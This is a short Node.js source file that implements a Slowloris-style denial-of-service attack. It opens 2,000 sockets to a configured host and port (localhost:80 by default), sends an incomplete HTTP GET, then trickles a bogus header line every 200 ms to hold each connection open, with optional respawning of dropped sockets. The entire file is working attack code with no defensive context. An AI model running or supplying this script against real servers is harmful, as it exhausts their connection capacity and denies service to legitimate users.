const net = require('net')

const opts = {
	host: 'localhost',
	port: 80,
	sockets: 2000,
	respawn: false,
	rate: 200,
	method: 'GET',
	path: '/'
}

let activeSockets = 0

console.log('Starting sockets...')

const addSocket = () => {
	
	let socket = new net.Socket()

	socket.connect(opts.port, opts.host)

	socket.on('connect', () => {
		socket.write(`${opts.method} ${opts.path} HTTP/1.1\n`, 'ascii', () => {
			console.log('Socket activated. (Total active: ' + activeSockets + ')')
			activeSockets++

			socket.write(`Host: ${opts.host}\n`)
			let sentPacketCount = 0

			const intv = setInterval(() => {
				if(!socket) clearInterval(intv)
				else {
					socket.write(`x-header-${sentPacketCount}: ${sentPacketCount}\n`)
					sentPacketCount++
				}
			}, opts.rate)
		})

		socket.on('error', err => {
			console.log('Socket error - ' + err.message)
			socket.destroy()
		})

		socket.on('data', (data) => {
			console.log('Socket data - ' + data.toString())
		})

		socket.on('close', () => {
			activeSockets--
			socket = false
			
			if (opts.respawn) {
				console.log('Respawning dead socket...')
				addSocket()
			}
		})
	})

	socket.on('error', err => {
		console.log(`Server down.`)
	})
}

for (let i=0;i<opts.sockets; i++) {
	addSocket()
}